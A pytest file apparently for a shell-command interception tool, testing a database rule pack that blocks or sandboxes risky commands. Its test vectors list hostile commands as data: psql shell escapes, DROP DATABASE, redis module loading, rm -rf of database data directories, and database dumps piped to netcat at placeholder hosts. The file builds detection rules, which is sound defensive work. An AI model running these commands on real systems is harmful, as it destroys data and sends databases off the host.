"""Tests for the FULL ``db`` rule-pack catalogue (TJ-GAP-062).

The DF-TERMINAL-JAIL-23 mechanism-proof pack carried three rules; TJ-GAP-062
lands the whole researched catalogue. Two things this file exists to pin:

* **every rule fires on its own vector through the live engine** — driven
  through ``intercept()`` with the shipped pack installed into a SCRATCH
  ``TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR`` (never the host's live rules
  dir, which may hold a stale ``00-builtins.yaml``), and asserted by RULE ID so
  a rule that quietly stops compiling cannot hide behind a sibling's match;
* **the false-positive class DF-23 closed stays closed, extended to the new
  rules** — a destructive shape carried as PROSE (a sed replacement, a commit
  message, a grep argument, a quoted data literal, an ``echo`` redirect) is not
  attributed to the pack, and every legitimate workflow pin keeps its verdict.

COMMAND FORM. ``standalone/terminal-jail`` rebuilds the command string by
single-quoting every argv token before handing it to the bridge, so a pipeline
reaches the engine as ``'pg_dump' 'db' '|' 'nc' 'h' 'p'`` — ONE parser segment
(a quoted ``|`` is not an operator) whose quote-stripped form is
``pg_dump db | nc h p``. The engine therefore sees a DIFFERENT byte string than
a shell user types. Both forms are exercised here: ``_raw`` for the typed text
and ``_argv`` for the wrapper's delivery. The pipe-spanning rule
(``pack-db-dump-exfil``) is asserted through ``_argv`` because that is the
production path where it fires; its BARE-pipe reach is asserted separately, as a
pinned residual, so the boundary is visible rather than implied.

VERDICT DOCTRINE. Gray-zone shapes (a single-table DROP, a bare TRUNCATE, bulk
dump/restore) come out ``modify`` — the namespace wrap, command still runs;
hard shapes come out ``block``.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from terminal_jail.interruptor import Action, intercept

PROJECT_ROOT = Path(__file__).resolve().parent.parent
PACKS_DIR = PROJECT_ROOT / "plugin" / "terminal_jail" / "rules" / "packs"
DB_PACK = PACKS_DIR / "db.yaml"

# The installer's own destination file name (install.sh byte-copies the pack
# here), which is what makes the load path identical to a real install.
INSTALLED_PACK_NAME = "terminal-jail-pack-db.yaml"


# ---------------------------------------------------------------------------
# fixtures / helpers
# ---------------------------------------------------------------------------


def _scratch_rule_dirs(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Point the engine at a scratch rules dir + an empty system rules dir."""
    rules_dir = tmp_path / "rules.d"
    rules_dir.mkdir()
    empty_system = tmp_path / "empty-system-rules.d"
    empty_system.mkdir()
    monkeypatch.setenv("TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR", str(rules_dir))
    monkeypatch.setenv("TERMINAL_JAIL_INTERRUPTOR_RULES_DIR", str(empty_system))
    return rules_dir


@pytest.fixture()
def installed_pack(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """The shipped ``db`` pack installed under the installer's own file name."""
    rules_dir = _scratch_rule_dirs(tmp_path, monkeypatch)
    (rules_dir / INSTALLED_PACK_NAME).write_bytes(DB_PACK.read_bytes())
    return rules_dir


@pytest.fixture()
def empty_rules(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """The same scratch config, but with NO pack installed (control)."""
    return _scratch_rule_dirs(tmp_path, monkeypatch)


def _raw(*args: str) -> str:
    """The command as a shell user types it, with shell quoting applied.

    Each argument is single-quoted like a shell word, so a caller can write the
    command the way it would appear in a terminal and still get the quoting the
    parser normally sees.
    """
    return " ".join("'" + a.replace("'", "'\\''") + "'" for a in args)


def _argv(*args: str) -> str:
    """The command exactly as ``standalone/terminal-jail`` delivers it.

    The wrapper single-quotes EVERY argv token when it rebuilds the command
    string for the interruptor bridge (see its ``CMD_STR`` loop), so this is
    the byte string the engine actually evaluates for an invocation made
    through the wrapper.
    """
    return " ".join("'" + a.replace("'", "'\\''") + "'" for a in args)


# ---------------------------------------------------------------------------
# TJ-GAP-062 c: every new BLOCK rule, one vector per rule id
# ---------------------------------------------------------------------------

# (rule id, client prefix, statement argument). The command under test is
# `prefix + " " + argument`, built with `_raw` unless it carries a pipe — see
# the module docstring: a pipe-spanning rule is only reachable in the wrapper's
# argv form, so those vectors live in DB_PACK_EXFIL_VECTORS instead.
DB_PACK_BLOCK_VECTORS = (
    # 1. psql meta-shell escape — every shape psql accepts
    ("pack-db-psql-meta-shell", "psql -c", '"\\! rm -rf /tmp/x"'),
    ("pack-db-psql-meta-shell", "psql -c", '"\\! id"'),
    ("pack-db-psql-meta-shell", "psql template1 -c", '"\\! sh"'),
    ("pack-db-psql-meta-shell", "psql --command=", '\\! sh'),
    ("pack-db-psql-meta-shell", "psql --command", '"\\! sh"'),
    # 2. SQL destruction in an execution context
    ("pack-db-drop-database", "psql -c", '"DROP DATABASE prod"'),
    ("pack-db-drop-database", "psql -c", '"DROP SCHEMA public CASCADE"'),
    ("pack-db-drop-database", "mysql -e", '"drop database prod"'),
    ("pack-db-drop-database", "psql -c", '"SELECT 1; DROP DATABASE x"'),
    ("pack-db-drop-database", "sqlite3 app.db", '"DROP DATABASE x"'),
    # 3. TRUNCATE ... CASCADE (the FK-closure spelling)
    ("pack-db-truncate-cascade", "psql -c", '"TRUNCATE users CASCADE"'),
    ("pack-db-truncate-cascade", "psql -e", '"TRUNCATE TABLE t CASCADE"'),
    # 4. admin shutdown
    ("pack-db-admin-shutdown", "mysqladmin shutdown", ""),
    ("pack-db-admin-shutdown", "mariadb-admin shutdown", ""),
    ("pack-db-admin-shutdown", "mysqladmin -u root -p shutdown", ""),
    # 5. redis
    ("pack-db-redis-config", "redis-cli CONFIG SET dir /var/lib/redis", ""),
    ("pack-db-redis-config", "redis-cli CONFIG SET dbfilename evil.so", ""),
    ("pack-db-redis-config", "redis-cli CONFIG REWRITE", ""),
    ("pack-db-redis-module", "redis-cli MODULE LOAD /tmp/evil.so", ""),
    ("pack-db-redis-module", "redis-cli MODULE UNLOAD evil", ""),
    ("pack-db-redis-flush", "redis-cli FLUSHALL", ""),
    ("pack-db-redis-flush", "redis-cli FLUSHDB ASYNC", ""),
    # 6. mongosh
    ("pack-db-mongosh-drop", "mongosh --eval", '"db.dropDatabase()"'),
    ("pack-db-mongosh-drop", "mongo --eval", '"db.dropDatabase()"'),
    ("pack-db-mongosh-drop", "mongosh --eval", '"db.users.drop()"'),
    ("pack-db-mongosh-shutdown", "mongosh --eval", '"db.adminCommand({shutdown: 1})"'),
    ("pack-db-mongosh-shutdown", "mongo --eval", '"db.adminCommand({shutdown:1})"'),
    # 7. live data paths
    ("pack-db-data-dir-delete", "rm -rf /var/lib/postgresql/16/main", ""),
    ("pack-db-data-dir-delete", "rm -rf /var/lib/mysql", ""),
    ("pack-db-data-dir-delete", "rm -rf /var/lib/mongodb", ""),
    ("pack-db-data-dir-delete", "rm -rf /var/lib/redis", ""),
    ("pack-db-data-dir-delete", "rm -f /home/kara/duckbrain/role.duckdb", ""),
    ("pack-db-data-dir-delete", "rm -rf /home/kara/x/board.duckdb", ""),
)

DB_PACK_BLOCK_VECTORS = tuple(
    (rule_id, " ".join(part for part in (prefix, argument) if part))
    for rule_id, prefix, argument in DB_PACK_BLOCK_VECTORS
)

# The pipe-spanning rule. `_argv` is REQUIRED: these are pasted as argv words so
# the wrapper's single-quoting produces one parser segment (see module docstring).
DB_PACK_EXFIL_VECTORS = (
    ("pg_dump", "mydb", "|", "nc", "1.2.3.4", "4444"),
    ("pg_dump", "-U", "u", "mydb", "|", "nc", "host.example", "9000"),
    ("mysqldump", "-u", "root", "db", "|", "ncat", "--send-only", "1.2.3.4", "4444"),
    ("pg_dump", "mydb", "|", "netcat", "1.2.3.4", "4444"),
    # intermediate stages between the dump and the sink
    ("pg_dump", "mydb", "|", "gzip", "|", "nc", "1.2.3.4", "4444"),
)

# ---------------------------------------------------------------------------
# TJ-GAP-062 d: gray-zone shapes -> MODIFY (auto-sandbox), never block
# ---------------------------------------------------------------------------

DB_PACK_GRAY_VECTORS = (
    # a single-table DROP: destructive but scoped to named tables
    ("pack-db-drop-table", "psql -c", '"DROP TABLE users"'),
    ("pack-db-drop-table", "mysql -e", '"DROP TABLE customers"'),
    ("pack-db-drop-table", "psql -c", '"DROP TABLE users CASCADE"'),
    ("pack-db-drop-table", "sqlite3 app.db", '"DROP TABLE legacy"'),
    # a TRUNCATE with no CASCADE / RESTART IDENTITY: one table's rows
    ("pack-db-truncate", "psql -c", '"TRUNCATE users"'),
    ("pack-db-truncate", "psql -c", '"TRUNCATE TABLE t"'),
    # bulk dump/restore tooling
    ("pack-db-dump-restore", "pg_dump mydb", ""),
    ("pack-db-dump-restore", "pg_dump --version", ""),
    ("pack-db-dump-restore", "pg_restore -d mydb /tmp/dump.sql", ""),
)

DB_PACK_GRAY_VECTORS = tuple(
    (rule_id, " ".join(part for part in (prefix, argument) if part))
    for rule_id, prefix, argument in DB_PACK_GRAY_VECTORS
)

# A dump to a LOCAL FILE is still the same gray wrap (no network sink).
DB_PACK_DUMP_TO_FILE = (
    "pg_dump mydb > /tmp/dump.sql",
    "pg_dump mydb | gzip > /tmp/dump.sql.gz",
)

# ---------------------------------------------------------------------------
# false-positive contexts: the pack must not be ATTRIBUTED at all
# ---------------------------------------------------------------------------

# Every entry carries the destructive words as TEXT — in a sed replacement, a
# commit message, a grep argument, an echo/printf body, or a quoted SQL data
# literal. DF-TERMINAL-JAIL-23 fixed exactly this class for the DROP statements;
# TJ-GAP-062 extends the same discipline to every new rule.
DB_PACK_FALSE_POSITIVE_CONTEXTS = (
    # DF-23's original remediation-deadlock set
    "sed -i 's/DROP DATABASE/-- DROP DATABASE/' migrations/003_shard.sql",
    "git commit -am 'park the DROP DATABASE migration'",
    "psql -c 'SELECT msg FROM t WHERE msg = \\'drop database retry\\''",
    "echo 'DROP TABLE users' > build/rollback.sql",
    "psql -f migrations/002_legacy.sql",
    "grep -rn 'DROP TABLE' migrations/",
    # …extended to every new rule's vocabulary
    "git commit -am 'note the redis-cli FLUSHALL incident'",
    "git commit -am 'mysqladmin shutdown took the db down'",
    "echo 'TRUNCATE users CASCADE' > notes.txt",
    "echo 'redis-cli CONFIG SET dir /tmp' >> notes.txt",
    "echo 'mongosh --eval db.dropDatabase()' >> notes.txt",
    "psql -c 'SELECT * FROM t WHERE x = \\'mongosh --eval db.dropDatabase()\\''",
    "grep -rn 'rm -rf /var/lib/mysql' .",
    "grep -rn 'TRUNCATE users CASCADE' docs/",
    "git log --grep='mysqladmin shutdown'",
    "psql -c 'SELECT * FROM shutdown_log'",
    # the psql meta-shell escape as text, never as an argument-leading escape
    "echo '\\\\! sh' > notes.txt",
    "printf '\\\\!\\\\n' > notes.txt",
    "sed -i 's/\\\\!/--/' migrations/x.sql",
    # a `\!` inside a psql argument is a SQL syntax error, not a shell escape
    "psql -c 'SELECT * FROM t WHERE col = 1 \\\\!= 2'",
    # non-data paths and non-delete commands that mention the same words
    "rm -rf ./build",
    "rm -rf /tmp/scratch",
    "nc -z example.com 443",
)


# ---------------------------------------------------------------------------
# legit pins: real fleet workflows that must keep their verdict
# ---------------------------------------------------------------------------

# (command, expected action, expected rule id). `None` for the rule id means the
# pack must NOT be the attribution (default-allow, or a builtin).
DB_PACK_LEGIT_PINS = (
    ("psql -c 'SELECT 1'", Action.ALLOW, None),
    ("psql -f migrations/002_legacy.sql", Action.ALLOW, None),
    ("sqlite3 state.db 'INSERT INTO t VALUES (1)'", Action.ALLOW, None),
    ("sqlite3 state.db 'SELECT * FROM t'", Action.ALLOW, None),
    ("alembic upgrade head", Action.ALLOW, None),
    ("python -c 'import sqlalchemy'", Action.ALLOW, None),
    ("redis-cli GET foo", Action.ALLOW, None),
    ("redis-cli SET foo bar", Action.ALLOW, None),
    ("redis-cli CONFIG GET dir", Action.ALLOW, None),
    ("mysqladmin status", Action.ALLOW, None),
    ("pg_dump mydb", Action.MODIFY, "pack-db-dump-restore"),
    ("pg_dump mydb > /tmp/dump.sql", Action.MODIFY, "pack-db-dump-restore"),
)


def _assert_not_pack_attributed(result, command: str) -> None:
    assert result.action != Action.BLOCK, (command, result)
    assert not str(result.rule_id or "").startswith("pack-"), (command, result)


# ---------------------------------------------------------------------------
# the full catalogue through the live engine
# ---------------------------------------------------------------------------


class TestDbPackBlockCatalogue:
    """Every BLOCK rule in the TJ-GAP-062 catalogue fires on its own vector."""

    @pytest.mark.parametrize(("rule_id", "command"), DB_PACK_BLOCK_VECTORS)
    def test_block_rule_fires_on_its_vector(
        self, installed_pack: Path, rule_id: str, command: str
    ) -> None:
        result = intercept(command)

        assert result.action == Action.BLOCK, (command, result)
        assert result.rule_id == rule_id, (command, result)
        assert result.reason, "a block verdict must carry its message"

    @pytest.mark.parametrize("argv", DB_PACK_EXFIL_VECTORS)
    def test_dump_piped_to_a_network_target_blocks(
        self, installed_pack: Path, argv: tuple[str, ...]
    ) -> None:
        """The exfil rule, in the form the WRAPPER produces.

        ``_argv`` reproduces standalone/terminal-jail's single-quoting, which
        keeps the pipe inside one parser segment; a pack rule is evaluated per
        segment (Layer 4), so this — the production path — is where the rule
        fires and blocks.
        """
        command = _argv(*argv)
        result = intercept(command)

        assert result.action == Action.BLOCK, (argv, result)
        assert result.rule_id == "pack-db-dump-exfil", (argv, result)

    def test_raw_pipe_form_is_a_documented_residual_not_a_silent_hole(
        self, installed_pack: Path
    ) -> None:
        """The BARE-pipe form through the Python API: sandboxed, not blocked.

        The parser splits `pg_dump db | nc host 4444` at the operator, so this
        per-segment rule sees only the dump stage. The vector is NOT unprotected
        — the engine still wraps it (`modify`, the command runs under namespace
        isolation) — but the pack cannot attribute it. Pinned HERE, as a
        residual, so the day the engine's whole-command pass learns to reach
        Layer 4 this test fails loudly and the behaviour can be re-decided
        rather than the gap drifting unnoticed (pack header residual (f)).
        """
        result = intercept("pg_dump mydb | nc 1.2.3.4 4444")

        assert result.action == Action.MODIFY, result
        assert result.rule_id == "pack-db-dump-restore", result

    @pytest.mark.parametrize("command", DB_PACK_DUMP_TO_FILE)
    def test_dump_to_a_local_file_is_not_the_exfil_rule(
        self, installed_pack: Path, command: str
    ) -> None:
        """A backup written to a FILE has no network sink — not the exfil shape."""
        result = intercept(command)

        assert result.rule_id != "pack-db-dump-exfil", (command, result)
        assert result.rule_id == "pack-db-dump-restore", (command, result)

    def test_block_vectors_are_unattributed_without_the_pack(
        self, empty_rules: Path
    ) -> None:
        """Control: with no pack installed no block vector is a pack attribution."""
        for rule_id, command in DB_PACK_BLOCK_VECTORS:
            result = intercept(command)
            assert result.rule_id != rule_id, (command, result)
            assert not str(result.rule_id or "").startswith("pack-"), (command, result)
        for argv in DB_PACK_EXFIL_VECTORS:
            result = intercept(_argv(*argv))
            assert not str(result.rule_id or "").startswith("pack-"), (argv, result)


class TestDbPackGrayZone:
    """Gray shapes are auto-sandboxed (the command still runs), never blocked."""

    @pytest.mark.parametrize(("rule_id", "command"), DB_PACK_GRAY_VECTORS)
    def test_gray_shape_is_sandboxed_not_blocked(
        self, installed_pack: Path, rule_id: str, command: str
    ) -> None:
        result = intercept(command)

        assert result.action == Action.MODIFY, (command, result)
        assert result.rule_id == rule_id, (command, result)
        # A sandbox verdict is a rewrite, not a refusal: the command still runs,
        # wrapped in the namespace prefix.
        assert result.modified, (command, result)
        assert "unshare" in result.modified, (command, result)

    def test_no_gray_vector_is_blocked_by_the_pack(self, installed_pack: Path) -> None:
        """The doctrine in one assertion: every gray vector runs.

        This is the guard against a future edit that promotes a gray shape to a
        block — the exact over-blocking the gray-zone doctrine forbids.
        """
        for rule_id, command in DB_PACK_GRAY_VECTORS:
            result = intercept(command)
            assert result.action != Action.BLOCK, (rule_id, command, result)


class TestDbPackFalsePositives:
    """The destructive words as TEXT are never attributed to the pack."""

    @pytest.mark.parametrize("command", DB_PACK_FALSE_POSITIVE_CONTEXTS)
    def test_text_context_is_not_attributed_to_the_pack(
        self, installed_pack: Path, command: str
    ) -> None:
        result = intercept(command)

        _assert_not_pack_attributed(result, command)

    def test_false_positive_contexts_are_unattributed_without_the_pack(
        self, empty_rules: Path
    ) -> None:
        """Control: the same contexts are also clean with no pack installed.

        Without this, a context could pass merely because an unrelated builtin
        happens to claim it first, and the pack's own over-reach would go
        unnoticed.
        """
        for command in DB_PACK_FALSE_POSITIVE_CONTEXTS:
            result = intercept(command)
            assert not str(result.rule_id or "").startswith("pack-"), (command, result)


class TestDbPackLegitPins:
    """Real fleet workflows keep their verdict with the pack installed."""

    @pytest.mark.parametrize(("command", "action", "rule_id"), DB_PACK_LEGIT_PINS)
    def test_legit_pin_keeps_its_verdict(
        self,
        installed_pack: Path,
        command: str,
        action: Action,
        rule_id: str | None,
    ) -> None:
        result = intercept(command)

        assert result.action == action, (command, result)
        if rule_id is None:
            assert not str(result.rule_id or "").startswith("pack-"), (command, result)
        else:
            assert result.rule_id == rule_id, (command, result)

    @pytest.mark.parametrize(("command", "action", "rule_id"), DB_PACK_LEGIT_PINS)
    def test_legit_pins_hold_without_the_pack_too(
        self, empty_rules: Path, command: str, action: Action, rule_id: str | None
    ) -> None:
        """Control: the pins are not artifacts of the pack being installed."""
        result = intercept(command)
        if rule_id is not None:
            assert result.rule_id != rule_id, (command, result)


# ---------------------------------------------------------------------------
# the pack file itself
# ---------------------------------------------------------------------------


class TestShippedDbPackFile:
    """Structural pins on the shipped catalogue: ids, layers, no deferral note."""

    EXPECTED_IDS = {
        # BLOCK (950)
        "pack-db-psql-meta-shell",
        "pack-db-drop-database",
        "pack-db-truncate-cascade",
        "pack-db-admin-shutdown",
        "pack-db-redis-config",
        "pack-db-redis-module",
        "pack-db-redis-flush",
        "pack-db-mongosh-drop",
        "pack-db-mongosh-shutdown",
        "pack-db-data-dir-delete",
        "pack-db-dump-exfil",
        # SANDBOX (650)
        "pack-db-drop-table",
        "pack-db-truncate",
        "pack-db-dump-restore",
    }

    def test_every_catalogued_rule_id_is_present_exactly_once(self) -> None:
        import yaml

        data = yaml.load(DB_PACK.read_text(encoding="utf-8"), Loader=yaml.CSafeLoader)
        ids = [rule["id"] for rule in data["rules"]]

        assert len(ids) == len(set(ids)), f"duplicate ids in the pack: {ids}"
        assert set(ids) == self.EXPECTED_IDS, sorted(set(ids) ^ self.EXPECTED_IDS)

    def test_block_rules_carry_the_pack_block_priority_and_sandboxes_the_gray_one(
        self,
    ) -> None:
        import yaml

        data = yaml.load(DB_PACK.read_text(encoding="utf-8"), Loader=yaml.CSafeLoader)
        for rule in data["rules"]:
            if rule["action"] == "block":
                assert rule["priority"] == 950, (rule["id"], rule["priority"])
            else:
                assert rule["action"] == "sandbox", (rule["id"], rule["action"])
                assert rule["priority"] == 650, (rule["id"], rule["priority"])

    def test_the_deferral_note_is_gone(self) -> None:
        """The pack must claim the FULL catalogue now, not defer it.

        Before TJ-GAP-062 the header ended with a note saying the wider
        catalogue 'is TJ-GAP-062 and is deliberately NOT in this file'. Landing
        the catalogue without removing that line would leave the file telling
        its reader the opposite of what it contains.
        """
        text = DB_PACK.read_text(encoding="utf-8")

        assert "deliberately NOT in this file" not in text
        assert "FULL CATALOGUE (TJ-GAP-062)" in text

    def test_every_rule_is_a_single_pattern_or_a_two_condition_composite(self) -> None:
        """A pack rule may not use a match type the engine cannot dispatch.

        `pattern` and `composite` are the only types used here; in particular the
        pack does NOT rely on `pipeline`, which parse_command can never reach
        (documented in the pack header).
        """
        import yaml

        data = yaml.load(DB_PACK.read_text(encoding="utf-8"), Loader=yaml.CSafeLoader)
        for rule in data["rules"]:
            match = rule["match"]
            assert match["type"] in ("pattern", "composite"), (rule["id"], match)
            if match["type"] == "composite":
                assert match["operator"] == "and", rule["id"]
                assert len(match["conditions"]) == 2, rule["id"]
                for cond in match["conditions"]:
                    assert cond["type"] == "pattern", rule["id"]


class TestDbPackPriorityDisjointness:
    """One vector, one rule id: no two pack rules claim the same vector.

    The DROP TABLE family is the interesting pair — the block rule declines the
    CASCADE spelling precisely so the gray sandbox rule can own it. This is
    asserted directly rather than inferred from the per-rule tests above.
    """

    @pytest.mark.parametrize(
        ("command", "expected"),
        (
            ('psql -c "DROP TABLE users"', "pack-db-drop-table"),
            ('psql -c "DROP TABLE users CASCADE"', "pack-db-drop-table"),
            ('psql -c "TRUNCATE users"', "pack-db-truncate"),
            ('psql -c "TRUNCATE users CASCADE"', "pack-db-truncate-cascade"),
        ),
    )
    def test_exactly_one_rule_claims_each_statement(
        self, installed_pack: Path, command: str, expected: str
    ) -> None:
        result = intercept(command)

        assert result.rule_id == expected, (command, result)
